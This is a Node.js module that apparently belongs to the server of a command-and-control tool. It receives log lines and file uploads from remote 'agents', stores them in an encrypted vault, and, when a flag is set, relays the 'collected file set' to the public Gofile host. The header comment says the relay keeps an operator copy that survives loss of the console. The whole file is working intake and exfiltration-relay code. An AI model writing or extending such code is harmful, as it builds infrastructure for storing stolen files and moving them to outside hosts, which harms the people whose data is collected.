// server/hypochlorite/store.mjs — log ingestion and vault intake
//
// Two intake paths:
//   1. reagent log lines  -> log ring in the state file
//   2. raw binary upload  -> gunzip (if flagged) -> sealed vault file
//
// Bundles tagged "hypochlorite" (the collected file set) are also
// relayed to the gofile archive layer when CHLORUM_GOFILE=1, so the
// operator keeps an off-console copy that survives console loss.

import { gunzipSync } from "node:zlib";
import { saveVaultFile } from "../../chloride/vault.mjs";
import { deriveVaultKey } from "./register.mjs";
import { uploadToGofile } from "../gofile.mjs";

const SEVERITIES = new Set(["info", "warn", "crit"]);

function safeName(name, agentId) {
  const base = String(name || "drop")
    .split(/[\\/]/)
    .pop()
    .replace(/[^A-Za-z0-9._-]/g, "_")
    .slice(0, 80);
  return `${agentId}-${Date.now()}-${base || "drop"}.chl`;
}

export function ingestLogLines(state, agentId, lines) {
  if (!Array.isArray(lines)) return 0;
  let count = 0;
  for (const line of lines.slice(0, 50)) {
    if (typeof line !== "string" || !line.trim()) continue;
    const severity = "info";
    state.addLog(agentId, "hypochlorite", severity, line.slice(0, 2000));
    count += 1;
  }
  return count;
}

export async function ingestUpload({ config, state, agentId, taskId, kind, name, gzip, body }) {
  let plaintext = Buffer.from(body);
  if (gzip) {
    try {
      plaintext = gunzipSync(plaintext);
    } catch {
      return { ok: false, error: "bad gzip payload" };
    }
  }
  if (plaintext.length === 0) {
    return { ok: false, error: "empty payload" };
  }

  const vaultName = safeName(name, agentId);
  saveVaultFile(
    config.vaultDir,
    `${agentId}/${vaultName}`,
    deriveVaultKey(taskId, config.adminToken),
    plaintext
  );
  state.addArtifact(agentId, vaultName, plaintext.length, kind);

  let archive = null;
  if (kind === "hypochlorite" && config.gofileRelay) {
    try {
      archive = await uploadToGofile(plaintext, vaultName.replace(/\.chl$/, ""));
      state.addArchiveRecord({
        at: new Date().toISOString(),
        code: archive.code,
        downloadPage: archive.downloadPage,
        name: vaultName,
        size: plaintext.length,
      });
    } catch (err) {
      state.addLog(agentId, "gofile", "warn", `archive relay failed: ${err.message}`);
    }
  }

  state.addLog(agentId, "vault", "info", `sealed ${vaultName} (${plaintext.length} bytes)${archive ? " + archived" : ""}`);
  return { ok: true, stored: vaultName, archive };
}
